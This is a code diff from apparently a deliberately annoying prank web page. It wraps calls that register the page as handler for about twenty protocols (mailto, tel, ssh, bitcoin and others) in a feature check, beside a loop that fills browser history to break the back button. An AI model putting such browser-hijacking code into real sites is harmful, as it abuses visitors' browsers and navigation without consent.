@@ -24,27 +24,29 @@
   })
 
   // Ask to handle web links with whitelisted protocols
-  const handlerUrl = window.location.href + '/url=%s'
-  navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('im', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('news', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
+  if (navigator.registerProtocolHandler) {
+    const handlerUrl = window.location.href + '/url=%s'
+    navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('im', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('news', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
+  }
 
   // Fill up the history so the back button does not work
   for (let i = 1; i < 20; i++) {
